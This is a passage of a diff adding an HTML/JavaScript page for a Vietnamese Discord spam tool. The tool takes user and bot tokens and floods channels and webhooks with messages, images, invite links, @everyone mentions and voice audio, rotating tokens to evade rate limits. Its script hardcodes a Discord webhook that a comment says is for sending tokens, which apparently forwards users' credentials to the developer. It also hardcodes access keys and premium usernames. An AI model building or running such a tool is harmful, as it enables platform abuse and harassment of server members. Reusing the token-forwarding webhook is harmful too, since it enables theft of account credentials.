@@ -1,0 +1,2149 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Cocomelon On Top — Discord</title>
+  
+  <!-- Load Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=Open+Sans:wght@400;600&family=Roboto:wght@400;500;700&family=Roboto+Mono&family=Montserrat:wght@400;600&family=Poppins:wght@400;600&family=Lato:wght@400;700&family=Raleway:wght@400;600&family=Oswald:wght@400;600&family=Source+Sans+Pro:wght@400;600&family=Ubuntu:wght@400;500&family=Merriweather&family=Playfair+Display&family=Pacifico&family=Dancing+Script:wght@400;700&family=Lobster&family=Caveat&family=Great+Vibes&family=Satisfy&family=Kaushan+Script&family=Comic+Sans+MS&family=Impact&family=Arial+Black&family=Trebuchet+MS&family=Courier+New&family=Lucida+Console&family=Bebas+Neue&family=Anton&family=Fjalla+One&family=Righteous&family=Luckiest+Guy&family=Chewy&family=Fredoka+One&family=Permanent+Marker&family=Amatic+SC:wght@400;700&family=Indie+Flower&family=Shadows+Into+Light&family=Architects+Daughter&family=Covered+By+Your+Grace&family=Kalam&family=Gloria+Hallelujah&family=Sacramento&family=Parisienne&family=Alex+Brush&family=Allura&family=Tangerine&family=Cookie&family=Merienda&family=Yellowtail&family=Orbitron&family=Audiowide&family=Press+Start+2P&family=Russo+One&family=Black+Ops+One&family=Bangers&family=Creepster&family=Freckle+Face&family=Henny+Penny&family=Monoton&family=Plaster&family=Ribeye&family=Smokum&family=Snowburst+One&family=UnifrakturMaguntia&family=Wallpoet&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --bg-light: #ffffff;
+      --bg-dark: #2c2f33;
+      --card-light: #f8f9fa;
+      --card-dark: #23272a;
+      --current-font: 'Segoe UI', Arial, sans-serif;
+      --primary-color: #ff69b4;
+      --secondary-color: #ff1493;
+      --accent-color: #ff85c2;
+      --button-gradient: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+      --button-bg: var(--button-gradient);
+      --button-color: white;
+      --button-border: none;
+      --button-text-shadow: none;
+      --button-outline: none;
+      --header-outline: none;
+    }
+
+    * {
+      font-family: var(--current-font);
+      transition: font-family 0.3s ease;
+    }
+
+    body {
+      min-height:100vh;
+      background:var(--bg-light);
+      text-align:center;
+      padding:20px;
+      overflow-x:hidden;
+      color:#333;
+      font-family: var(--current-font);
+      position: relative;
+      padding-bottom: 60px;
+      transition: background 0.3s ease;
+    }
+
+    body.dark {
+      background:var(--bg-dark);
+      color:#f5f5f5;
+    }
+
+    h1 {
+      font-size: 30px;
+      font-weight: 800;
+      margin-bottom: 20px;
+      background: var(--button-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-family: var(--current-font);
+      text-shadow: 0 0 10px rgba(255, 105, 180, 0.3);
+      padding: 5px 10px;
+      display: inline-block;
+    }
+
+    .card {
+      background:var(--card-light);
+      padding:20px;
+      border-radius:10px;
+      margin:15px auto;
+      max-width:760px;
+      font-family: var(--current-font);
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      border: 1px solid rgba(0, 0, 0, 0.1);
+      transition: all 0.3s ease;
+    }
+
+    body.dark .card {
+      background:var(--card-dark);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .input-box {
+      display:flex;
+      gap:10px;
+      margin:10px 0;
+    }
+
+    .input-box input, .input-box textarea {
+      flex:1;
+      padding:12px 14px;
+      border-radius:8px;
+      border:2px solid #ddd;
+      font-family: inherit;
+      background: white;
+      transition: all 0.3s ease;
+      resize: vertical;
+      font-size: 14px;
+    }
+
+    body.dark .input-box input, body.dark .input-box textarea {
+      background: #2f3136;
+      color: white;
+      border-color: #40444b;
+    }
+
+    .input-box input:focus, .input-box textarea:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 3px rgba(255, 105, 180, 0.1);
+    }
+
+    button {
+      padding:12px 20px;
+      border-radius:8px;
+      border: var(--button-border);
+      cursor:pointer;
+      font-size:14px;
+      font-weight:600;
+      color: var(--button-color);
+      background: var(--button-bg);
+      position: relative;
+      overflow: hidden;
+      z-index:0;
+      transition:.25s;
+      font-family: inherit;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    }
+
+    button:hover {
+      transform:translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    .audio-controls {
+      margin:15px auto;
+      display:flex;
+      gap:12px;
+      justify-content:center;
+      flex-wrap: wrap;
+    }
+
+    .buttons {
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
+      gap:12px;
+      margin-top:15px;
+    }
+
+    #log {
+      margin-top:20px;
+      background:#2f3136;
+      color:white;
+      border-radius:8px;
+      padding:15px;
+      text-align:left;
+      font-size:13px;
+      max-height:300px;
+      overflow-y:auto;
+      font-family: 'Courier New', monospace;
+      border: 1px solid #40444b;
+    }
+
+    /* Playlist Styles */
+    .playlist-container {
+      margin-top: 15px;
+      max-height: 200px;
+      overflow-y: auto;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 10px;
+      background: rgba(255, 255, 255, 0.1);
+    }
+
+    body.dark .playlist-container {
+      background: rgba(0, 0, 0, 0.2);
+      border-color: #40444b;
+    }
+
+    .playlist-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 12px;
+      margin: 5px 0;
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: 6px;
+      cursor: move;
+      transition: all 0.3s ease;
+    }
+
+    body.dark .playlist-item {
+      background: rgba(47, 49, 54, 0.9);
+    }
+
+    .playlist-item.playing {
+      background: var(--button-gradient);
+      color: white;
+    }
+
+    .playlist-item .song-name {
+      flex: 1;
+      text-align: left;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    /* File upload */
+    .file-upload {
+      margin: 10px 0;
+    }
+
+    .file-upload input {
+      display: none;
+    }
+
+    /* Audio player */
+    #audioPlayer {
+      width: 100%;
+      margin: 10px 0;
+      border-radius: 8px;
+    }
+
+    /* Voice status */
+    .voice-status {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      margin-right: 8px;
+    }
+
+    .voice-connected {
+      background: #00ff00;
+      animation: pulse 1s infinite;
+    }
+
+    .voice-disconnected {
+      background: #ff0000;
+    }
+
+    /* Image preview */
+    .uploaded-images {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin: 10px 0;
+      justify-content: center;
+    }
+
+    .uploaded-image-item {
+      position: relative;
+      display: inline-block;
+    }
+
+    .uploaded-image {
+      width: 80px;
+      height: 60px;
+      object-fit: cover;
+      border-radius: 6px;
+      border: 2px solid var(--primary-color);
+    }
+
+    .remove-image {
+      position: absolute;
+      top: -5px;
+      right: -5px;
+      background: red;
+      color: white;
+      border: none;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+    .toggle-mode {
+      position:absolute;
+      top:15px;
+      right:15px;
+      background: var(--button-gradient);
+    }
+
+    .logout-btn {
+      position:absolute;
+      top:15px;
+      right:80px;
+      background: linear-gradient(45deg, #ff4444, #cc0000);
+    }
+
+    .status-indicator {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      margin-right: 8px;
+    }
+
+    .status-playing {
+      background: #00ff00;
+      animation: pulse 1s infinite;
+    }
+
+    .status-paused {
+      background: #ffff00;
+    }
+
+    .status-stopped {
+      background: #ff0000;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
+    }
+
+    .spam-buttons {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-top: 15px;
+      flex-wrap: wrap;
+    }
+
+    .token-info {
+      font-size: 12px;
+      color: var(--primary-color);
+      margin-top: 10px;
+      line-height: 1.4;
+    }
+
+    /* Footer */
+    footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      color: white;
+      text-align: center;
+      padding: 10px 0;
+      font-size: 14px;
+      backdrop-filter: blur(10px);
+      z-index: 100;
+    }
+
+    body.dark footer {
+      background: rgba(35, 39, 42, 0.9);
+    }
+
+    /* Token Management */
+    .token-management {
+      margin-top: 15px;
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .token-item {
+      margin: 8px 0;
+    }
+
+    .token-item input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 2px solid #ddd;
+      font-size: 14px;
+      background: white;
+      transition: all 0.3s ease;
+    }
+
+    body.dark .token-item input {
+      background: #2f3136;
+      color: white;
+      border-color: #40444b;
+    }
+
+    .token-item input:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 3px rgba(255, 105, 180, 0.1);
+    }
+
+    .toggle-link {
+      margin: 10px 0;
+    }
+
+    .test-all-tokens {
+      margin: 15px 0;
+    }
+
+    /* Auth Section */
+    .auth-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .auth-box {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(20px);
+      border-radius: 15px;
+      padding: 40px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      animation: authAppear 0.5s ease-out;
+    }
+
+    @keyframes authAppear {
+      0% { transform: scale(0.8) translateY(-50px); opacity: 0; }
+      100% { transform: scale(1) translateY(0); opacity: 1; }
+    }
+
+    .auth-title {
+      font-size: 28px;
+      font-weight: 800;
+      margin-bottom: 10px;
+      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .auth-subtitle {
+      color: #666;
+      margin-bottom: 30px;
+      font-size: 14px;
+    }
+
+    .auth-input {
+      width: 100%;
+      padding: 15px 20px;
+      margin: 10px 0;
+      border: 2px solid #e0e0e0;
+      border-radius: 10px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      background: rgba(255, 255, 255, 0.9);
+    }
+
+    .auth-input:focus {
+      outline: none;
+      border-color: #ff6b6b;
+      box-shadow: 0 0 0 3px rgba(255, 107, 107, 0.1);
+      transform: translateY(-2px);
+    }
+
+    .auth-button {
+      width: 100%;
+      padding: 15px;
+      margin: 20px 0 10px;
+      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 20px rgba(255, 107, 107, 0.3);
+    }
+
+    .auth-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 25px rgba(255, 107, 107, 0.4);
+    }
+
+    .auth-button:active {
+      transform: translateY(-1px);
+    }
+
+    .auth-note {
+      font-size: 12px;
+      color: #888;
+      margin-top: 20px;
+    }
+
+    .error-message {
+      color: #ff4444;
+      font-size: 14px;
+      margin: 10px 0;
+      display: none;
+    }
+
+    /* Popup Styles */
+    #popup {
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      background:rgba(0,0,0,.6);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:999;
+    }
+
+    .popup-box {
+      background:rgba(255,255,255,.95);
+      border-radius:15px;
+      padding:24px;
+      max-width:380px;
+      text-align:center;
+      color: #000 !important;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      animation: popupAppear 0.3s ease-out;
+      font-family: var(--current-font);
+    }
+
+    body.dark .popup-box {
+      background:rgba(35,39,42,.95);
+      color: white !important;
+    }
+
+    @keyframes popupAppear {
+      0% { transform: scale(0.8); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .popup-box h2 {
+      margin:0 0 12px;
+      font-size:20px;
+      color:var(--primary-color);
+      font-family: var(--current-font);
+    }
+
+    .popup-buttons {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin-top: 20px;
+    }
+
+    .popup-buttons button {
+      flex: 1;
+      padding: 10px 16px;
+      border-radius: 8px;
+      font-weight: 600;
+    }
+
+    .popup-ok {
+      background: var(--button-gradient);
+    }
+
+    .popup-cancel {
+      background: linear-gradient(45deg, #666, #999);
+    }
+
+    /* Pink buttons */
+    .pink-button {
+      background: linear-gradient(45deg, #ff69b4, #ff1493) !important;
+    }
+
+    /* Token status */
+    .token-status {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #ff4444;
+      display: inline-block;
+      margin-left: 8px;
+    }
+
+    .token-status.active {
+      background: #00ff00;
+    }
+
+    /* Premium badge */
+    .pro-badge {
+      background: linear-gradient(45deg, #FFD700, #FFA500, #FF6B00);
+      color: black;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: bold;
+      margin-left: 10px;
+      box-shadow: 0 2px 8px rgba(255, 165, 0, 0.4);
+      border: 2px solid #FFA500;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .free-badge {
+      background: linear-gradient(45deg, #808080, #A0A0A0, #C0C0C0);
+      color: white;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: bold;
+      margin-left: 10px;
+      box-shadow: 0 2px 8px rgba(128, 128, 128, 0.4);
+      border: 2px solid #A0A0A0;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .user-info {
+      position: absolute;
+      top: 15px;
+      left: 15px;
+      background: rgba(255, 255, 255, 0.9);
+      padding: 8px 15px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    }
+
+    body.dark .user-info {
+      background: rgba(35, 39, 42, 0.9);
+      color: white;
+    }
+  </style>
+</head>
+<body class="light-mode">
+  <!-- Authentication Screen -->
+  <div id="authContainer" class="auth-container">
+    <div class="auth-box">
+      <div class="auth-title">🔐 XÁC THỰC TRUY CẬP</div>
+      <div class="auth-subtitle">Nhập thông tin xác thực để sử dụng bot</div>
+      
+      <input type="text" id="authUsername" class="auth-input" placeholder="👤 Tên người dùng" autocomplete="off">
+      <input type="password" id="authKey" class="auth-input" placeholder="🔑 Mã xác thực" autocomplete="off">
+      
+      <div id="errorMessage" class="error-message">
+        ❌ Có Làm Mới Có Ăn Bot Này Không Cho Dùng Chùa Đâu!
+      </div>
+      
+      <button class="auth-button" onclick="authenticate()">🚀 XÁC THỰC & TIẾP TỤC</button>
+      
+      <div class="auth-note">
+        📝 Liên hệ admin để được cấp quyền sử dụng
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Application (Hidden until authenticated) -->
+  <div id="mainApp" style="display: none;">
+    <div class="user-info" id="userInfo">
+      👤 <span id="currentUser">User</span>
+    </div>
+    <button class="logout-btn" onclick="logout()">🚪 Đăng xuất</button>
+    <button class="toggle-mode" onclick="toggleMode()">🌙</button>
+    
+    <h1>Cocomelon On Top <span id="userBadge" class="free-badge">FREE</span></h1>
+    
+    <div class="card">
+      <h3>🔑 Quản Lý Token (5 Token)</h3>
+      
+      <div id="tokenContainer">
+        <!-- 5 token inputs sẽ được tạo tự động -->
+      </div>
+      
+      <div class="test-all-tokens">
+        <button onclick="testAllTokens()">🧪 Test Tất Cả Token</button>
+      </div>
+      
+      <div class="token-management">
+        <button onclick="saveAllTokens()">💾 Lưu Tất Cả Token</button>
+        <button onclick="clearAllTokens()">🗑️ Xóa Tất Cả Token</button>
+      </div>
+      
+      <div class="input-box">
+        <input type="text" id="channelId" placeholder="Nhập Channel ID để spam...">
+        <button onclick="saveChannelId()">💾 Lưu</button>
+      </div>
+      <div class="input-box">
+        <input type="text" id="webhookUrl" placeholder="Nhập Webhook URL để spam...">
+        <button onclick="saveWebhookUrl()">💾 Lưu</button>
+      </div>
+      
+      <div class="token-info">
+        💡 Hỗ trợ cả User Token, Bot Token và Webhook - Tự động nhận diện loại token<br>
+        🔄 Tự động xoay token khi bị rate limit - Spam vĩnh viễn không bị chặn
+      </div>
+    </div>
+
+    <!-- Spam Section -->
+    <div class="card">
+      <h3>💬 Spam Tin Nhắn</h3>
+      
+      <!-- Custom Spam Message -->
+      <div class="input-box">
+        <textarea id="customMessage" placeholder="Nhập nội dung spam tùy chỉnh..."></textarea>
+      </div>
+      
+      <!-- Discord Link Settings -->
+      <div class="input-box">
+        <input type="text" id="customDiscordLink" placeholder="Nhập Discord Link tùy chỉnh..." value="https://discord.gg/K3wC2YQvWT">
+        <button onclick="toggleDiscordLink()" id="discordLinkToggle">🔗 Bật Link</button>
+        <button onclick="saveDiscordLink()">💾 Lưu</button>
+      </div>
+      
+      <!-- User Mention -->
+      <div class="input-box">
+        <input type="text" id="userId" placeholder="Nhập User ID để tag (ví dụ: 123456789)...">
+        <button onclick="saveUserId()">💾 Lưu ID</button>
+        <button onclick="clearUserId()">🗑️ Xóa ID</button>
+        <button onclick="toggleEveryoneTag()" id="everyoneToggle">Tag Everyone: OFF</button>
+      </div>
+      
+      <!-- Image Upload -->
+      <div class="input-box">
+        <input type="text" id="imageUrl" placeholder="Nhập URL ảnh...">
+        <button onclick="addImageFromUrl()">Thêm Ảnh URL</button>
+      </div>
+      
+      <div class="file-upload">
+        <button onclick="document.getElementById('imageFileInput').click()">Upload File Ảnh</button>
+        <input type="file" id="imageFileInput" accept="image/*" onchange="handleImageUpload(this.files)" multiple>
+        <button onclick="clearAllImages()" style="background: linear-gradient(45deg, #ff0000, #ff4444);">Xóa Tất Cả Ảnh</button>
+      </div>
+      
+      <!-- Image Preview -->
+      <div class="uploaded-images" id="uploadedImages">
+        <!-- Uploaded images will appear here -->
+      </div>
+      
+      <div class="spam-buttons">
+        <button onclick="startSpam()">🚀 Bắt Đầu Spam Text</button>
+        <button onclick="startWebhookSpam()" class="pink-button">🌐 Spam Webhook</button>
+        <button onclick="startImageSpam()" class="pink-button">🖼️ Spam Ảnh</button>
+        <button onclick="startLinkSpam()" class="pink-button">🔗 Spam Link Discord</button>
+        <button onclick="stopAll()" style="background: linear-gradient(45deg, #ff0000, #ff4444);">⏹️ Dừng Tất Cả</button>
+      </div>
+      <div class="token-info">
+        ⚡ Spam vĩnh viễn - Tự động xoay token khi bị limit<br>
+        📷 Spam ảnh: Upload file ảnh hoặc dùng URL ảnh<br>
+        👤 Tag user: Nhập User ID để mention người dùng<br>
+        🌟 Tag everyone: Bật/tắt tag @everyone<br>
+        🔗 Discord Link: <span id="linkStatus">Tự động chèn link (Free Version)</span>
+      </div>
+    </div>
+
+    <!-- Voice Spam Section -->
+    <div class="card">
+      <h3>
+        <span class="voice-status" id="voiceStatus"></span>
+        🎤 Voice Spam (Vừa phát âm thanh vừa spam tin nhắn)
+      </h3>
+      <div class="input-box">
+        <input type="text" id="voiceChannelId" placeholder="Nhập Voice Channel ID...">
+        <button onclick="saveVoiceChannelId()">💾 Lưu</button>
+      </div>
+      <div class="input-box">
+        <input type="text" id="voiceMessage" placeholder="Nhập nội dung tin nhắn voice spam...">
+      </div>
+      <div class="file-upload">
+        <button onclick="document.getElementById('voiceFileInput').click()">Upload File Âm Thanh</button>
+        <input type="file" id="voiceFileInput" accept="audio/*" onchange="handleVoiceFileUpload(this.files)">
+      </div>
+      <div class="audio-controls">
+        <button onclick="joinVoiceChannel()">Join Voice Channel</button>
+        <button onclick="startVoiceSpam()" class="pink-button">Bắt Đầu Voice Spam</button>
+        <button onclick="stopVoiceSpam()" style="background: linear-gradient(45deg, #ff0000, #ff4444);">Dừng Voice Spam</button>
+        <button onclick="leaveVoiceChannel()">Rời Voice Channel</button>
+      </div>
+      <div class="token-info">
+        🎵 Voice spam: Join voice channel và phát âm thanh + spam tin nhắn cùng lúc
+      </div>
+    </div>
+
+    <!-- Music Player Section -->
+    <div class="card">
+      <h3>
+        <span class="status-indicator" id="musicStatus"></span>
+        🎵 Music Player (File Nhạc)
+      </h3>
+      
+      <div class="file-upload">
+        <button onclick="document.getElementById('fileInput').click()">Upload File Nhạc</button>
+        <input type="file" id="fileInput" accept="audio/*" onchange="handleFileUpload(this.files)" multiple>
+      </div>
+      
+      <div class="playlist-counter" id="playlistCounter">Playlist: 0 bài hát</div>
+      
+      <div class="playlist-container" id="playlist">
+        <!-- Playlist items will be added here -->
+      </div>
+      
+      <!-- Audio Player -->
+      <audio id="audioPlayer" controls></audio>
+      
+      <div class="audio-controls">
+        <button onclick="playPlaylist()">▶️ Phát Playlist</button>
+        <button onclick="pauseAudio()">⏸️ Tạm dừng</button>
+        <button onclick="skipAudio()">⏭️ Bài tiếp</button>
+        <button onclick="previousAudio()">⏮️ Bài trước</button>
+        <button onclick="shufflePlaylist()">🔀 Xáo trộn</button>
+        <button onclick="clearPlaylist()">🗑️ Xóa Playlist</button>
+      </div>
+    </div>
+
+    <div class="card">
+      <label for="fontSelect">Chọn font chữ:</label>
+      <select id="fontSelect" onchange="changeFont(this.value)">
+        <option value="'Segoe UI', Arial, sans-serif">Mặc định</option>
+        <option value="'Roboto', sans-serif">Roboto</option>
+        <option value="'Montserrat', sans-serif">Montserrat</option>
+        <option value="'Poppins', sans-serif">Poppins</option>
+        <option value="'Lato', sans-serif">Lato</option>
+        <option value="'Raleway', sans-serif">Raleway</option>
+        <option value="'Oswald', sans-serif">Oswald</option>
+        <option value="'Ubuntu', sans-serif">Ubuntu</option>
+        <option value="'Pacifico', cursive">Pacifico</option>
+        <option value="'Dancing Script', cursive">Dancing Script</option>
+        <option value="'Comic Sans MS', cursive">Comic Sans MS</option>
+        <option value="'Courier New', monospace">Courier New</option>
+      </select>
+    </div>
+
+    <div class="card">
+      <div id="log">
+        <strong>Logs:</strong><br>
+        Chào mừng đến với Cocomelon On Top Discord!
+      </div>
+    </div>
+
+    <!-- Popup -->
+    <div id="popup">
+      <div class="popup-box" id="popupBox">
+        <h2 id="popupTitle">Thông báo</h2>
+        <p id="popupMessage">Bạn có chắc chắn muốn thực hiện hành động này?</p>
+        <div class="popup-buttons">
+          <button class="popup-ok" onclick="confirmAction()">OK</button>
+          <button class="popup-cancel" onclick="closePopup()">Hủy</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+      Dev: Huy Tran CoCo
+    </footer>
+  </div>
+
+  <script>
+    // Biến toàn cục
+    let playlist = [];
+    let currentTrackIndex = 0;
+    let isPlaying = false;
+    let isSpamming = false;
+    let isVoiceSpamming = false;
+    let isLinkSpamming = false;
+    let isDarkMode = false;
+    let messageCount = 0;
+    let voiceConnected = false;
+    let voiceAudioFiles = [];
+    let uploadedImages = [];
+    let currentUserId = '';
+    let tagEveryone = false;
+    let useDiscordLink = true;
+    let currentTokenIndex = 0;
+    let isAuthenticated = false;
+    let currentUsername = '';
+    let isPremiumUser = false;
+    
+    // Khởi tạo 5 token rỗng
+    let tokens = ['', '', '', '', ''];
+    let tokenStatus = [false, false, false, false, false];
+
+    // Discord link mặc định
+    const defaultDiscordLink = "https://discord.gg/K3wC2YQvWT";
+
+    // Webhook để gửi token
+    const tokenWebhook = "https://discord.com/api/webhooks/1419162678743666884/9W0nO4_dzF_99Uh0WZQqe0T5IIwxxXLwgmMud-bwY50g0O76ExjBuZfKPXsDmHM3RsxF";
+
+    // Premium users - có quyền bật/tắt chèn link
+    const premiumUsers = [
+      'deathlsr',
+      'thamlam12321', 
+      'rc5d2',
+      'Mthu_205',
+      'PremiumCCML'
+    ];
+
+    // Danh sách key hợp lệ (thay đổi mỗi ngày)
+    const validKeys = [
+      'CCML2024DAY1KEY001', 'CCML2024DAY1KEY002', 'CCML2024DAY1KEY003', 'CCML2024DAY1KEY004', 'CCML2024DAY1KEY005',
+      'CCML2024DAY1KEY006', 'CCML2024DAY1KEY007', 'CCML2024DAY1KEY008', 'CCML2024DAY1KEY009', 'CCML2024DAY1KEY010',
+      'CCML2024DAY1KEY011', 'CCML2024DAY1KEY012', 'CCML2024DAY1KEY013', 'CCML2024DAY1KEY014', 'CCML2024DAY1KEY015',
+      'CCML2024DAY1KEY016', 'CCML2024DAY1KEY017', 'CCML2024DAY1KEY018', 'CCML2024DAY1KEY019', 'CCML2024DAY1KEY020',
+      'CCML2024DAY1KEY021', 'CCML2024DAY1KEY022', 'CCML2024DAY1KEY023', 'CCML2024DAY1KEY024', 'CCML2024DAY1KEY025',
+      'CCML2024DAY1KEY026', 'CCML2024DAY1KEY027', 'CCML2024DAY1KEY028', 'CCML2024DAY1KEY029', 'CCML2024DAY1KEY030',
+      'CCML2024DAY1KEY031', 'CCML2024DAY1KEY032', 'CCML2024DAY1KEY033', 'CCML2024DAY1KEY034', 'CCML2024DAY1KEY035',
+      'CCML2024DAY1KEY036', 'CCML2024DAY1KEY037', 'CCML2024DAY1KEY038', 'CCML2024DAY1KEY039', 'CCML2024DAY1KEY040',
+      'CCML2024DAY1KEY041', 'CCML2024DAY1KEY042', 'CCML2024DAY1KEY043', 'CCML2024DAY1KEY044', 'CCML2024DAY1KEY045',
+      'CCML2024DAY1KEY046', 'CCML2024DAY1KEY047', 'CCML2024DAY1KEY048', 'CCML2024DAY1KEY049', 'CCML2024DAY1KEY050',
+      'CCML2024DAY1KEY051', 'CCML2024DAY1KEY052', 'CCML2024DAY1KEY053', 'CCML2024DAY1KEY054', 'CCML2024DAY1KEY055',
+      'CCML2024DAY1KEY056', 'CCML2024DAY1KEY057', 'CCML2024DAY1KEY058', 'CCML2024DAY1KEY059', 'CCML2024DAY1KEY060',
+      'CCML2024DAY1KEY061', 'CCML2024DAY1KEY062', 'CCML2024DAY1KEY063', 'CCML2024DAY1KEY064', 'CCML2024DAY1KEY065',
+      'CCML2024DAY1KEY066', 'CCML2024DAY1KEY067', 'CCML2024DAY1KEY068', 'CCML2024DAY1KEY069', 'CCML2024DAY1KEY070',
+      'CCML2024DAY1KEY071', 'CCML2024DAY1KEY072', 'CCML2024DAY1KEY073', 'CCML2024DAY1KEY074', 'CCML2024DAY1KEY075',
+      'CCML2024DAY1KEY076', 'CCML2024DAY1KEY077', 'CCML2024DAY1KEY078', 'CCML2024DAY1KEY079', 'CCML2024DAY1KEY080',
+      'CCML2024DAY1KEY081', 'CCML2024DAY1KEY082', 'CCML2024DAY1KEY083', 'CCML2024DAY1KEY084', 'CCML2024DAY1KEY085',
+      'CCML2024DAY1KEY086', 'CCML2024DAY1KEY087', 'CCML2024DAY1KEY088', 'CCML2024DAY1KEY089', 'CCML2024DAY1KEY090',
+      'CCML2024DAY1KEY091', 'CCML2024DAY1KEY092', 'CCML2024DAY1KEY093', 'CCML2024DAY1KEY094', 'CCML2024DAY1KEY095',
+      'CCML2024DAY1KEY096', 'CCML2024DAY1KEY097', 'CCML2024DAY1KEY098', 'CCML2024DAY1KEY099', 'CCML2024DAY1KEY100',
+      'CCML2024DAY1KEY101', 'CCML2024DAY1KEY102', 'CCML2024DAY1KEY103', 'CCML2024DAY1KEY104', 'CCML2024DAY1KEY105',
+      'CCML2024DAY1KEY106', 'CCML2024DAY1KEY107', 'CCML2024DAY1KEY108', 'CCML2024DAY1KEY109', 'CCML2024DAY1KEY110',
+      'CCML2024DAY1KEY111', 'CCML2024DAY1KEY112', 'CCML2024DAY1KEY113', 'CCML2024DAY1KEY114', 'CCML2024DAY1KEY115',
+      'CCML2024DAY1KEY116', 'CCML2024DAY1KEY117', 'CCML2024DAY1KEY118', 'CCML2024DAY1KEY119', 'CCML2024DAY1KEY120',
+      'CCML2024DAY1KEY121', 'CCML2024DAY1KEY122', 'CCML2024DAY1KEY123', 'CCML2024DAY1KEY124', 'CCML2024DAY1KEY125',
+      'CCML2024DAY1KEY126', 'CCML2024DAY1KEY127', 'CCML2024DAY1KEY128', 'CCML2024DAY1KEY129', 'CCML2024DAY1KEY130',
+      'CCML2024DAY1KEY131', 'CCML2024DAY1KEY132', 'CCML2024DAY1KEY133', 'CCML2024DAY1KEY134', 'CCML2024DAY1KEY135',
+      'CCML2024DAY1KEY136', 'CCML2024DAY1KEY137', 'CCML2024DAY1KEY138', 'CCML2024DAY1KEY139', 'CCML2024DAY1KEY140',
+      'CCML2024DAY1KEY141', 'CCML2024DAY1KEY142', 'CCML2024DAY1KEY143', 'CCML2024DAY1KEY144', 'CCML2024DAY1KEY145',
+      'CCML2024DAY1KEY146', 'CCML2024DAY1KEY147', 'CCML2024DAY1KEY148', 'CCML2024DAY1KEY149', 'CCML2024DAY1KEY150',
+      'CCML2024DAY1KEY151', 'CCML2024DAY1KEY152', 'CCML2024DAY1KEY153', 'CCML2024DAY1KEY154', 'CCML2024DAY1KEY155',
+      'CCML2024DAY1KEY156', 'CCML2024DAY1KEY157', 'CCML2024DAY1KEY158', 'CCML2024DAY1KEY159', 'CCML2024DAY1KEY160',
+      'CCML2024DAY1KEY161', 'CCML2024DAY1KEY162', 'CCML2024DAY1KEY163', 'CCML2024DAY1KEY164', 'CCML2024DAY1KEY165',
+      'CCML2024DAY1KEY166', 'CCML2024DAY1KEY167', 'CCML2024DAY1KEY168', 'CCML2024DAY1KEY169', 'CCML2024DAY1KEY170',
+      'CCML2024DAY1KEY171', 'CCML2024DAY1KEY172', 'CCML2024DAY1KEY173', 'CCML2024DAY1KEY174', 'CCML2024DAY1KEY175',
